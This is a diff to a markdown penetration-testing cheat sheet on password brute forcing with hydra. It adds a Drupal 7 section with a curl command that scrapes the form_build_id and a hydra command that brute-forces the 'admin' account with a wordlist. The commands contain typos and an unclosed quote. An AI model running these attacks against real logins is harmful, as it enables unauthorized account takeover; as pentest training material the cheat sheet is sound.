@@ -21,7 +21,7 @@ To brute for an FTP service with a known username try the following command.
 
 ## HTTP
 To brute for an HTTP form, try the following syntax with `hydra`:
-
+### Generic HTT POST Form
 `hydra -l (USERNAME) -P /path/to/wordlist.txt (TARGET IP ADDRESS) http-post-form "/URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^&(HTML FORM PASSWORD ATTRIBUTE)=^PASS^&Login=Login:(FAILED LOGIN MESSAGE)"`
 
 Where `HTML FORM USERNAME ATTRIBUTE` is the HTML form username "name" attribute. E.g.: `<input type=text name="username" />` In that example, the `username` value for the attribute `name` is what would be used. Same gfoes for the password: `<input type=password name="passwd" />` In that exmaple `passwd` would be used to construct the command as it is the value of the password input's name attribute. The command would then look something like so:
@@ -29,7 +29,18 @@ Where `HTML FORM USERNAME ATTRIBUTE` is the HTML form username "name" attribute.
   ... `:username=^USER^&passwd=^PASS^` ...
   
   `hydra` will fill in the `^USER^` and `^PASS^` values upon every single HTTP request with each username and password that you mean to test.
-  
+### Drupal 7
+In Drupal 7 we need to first get the form_build_id from the `./user/` directory as so,
+```
+root@wnl8:~# curl -s http://drupal.site/user/ | grep form_build_id | cut -d "\"" -f 6
+```
+Alternatively, if this does not provide a string, like, `form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw` for example, then simply hit CTRL+U on the `./user/` page and search for "form_build_id"
+Next, we can use Hydra on Drupal as so,
+```
+hydra -l admin -P /wordlists/rockyou.txt (TARGET DRUPAL IP) http-form-post "/?q=user/:name=admin&pass=^PASS^&form_id=user_login&form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry
+```
+And as you see, I have inserted the Drupal form ID and I am attempting to brute force the `admin` user.
+
 ## SMTP (IMAP SSL)
 To brute force SMTP via SSL Authentication, you must first enumerate which port ssl/imap is runniing on using `nmap`. In our case, we found port 993 as,
 
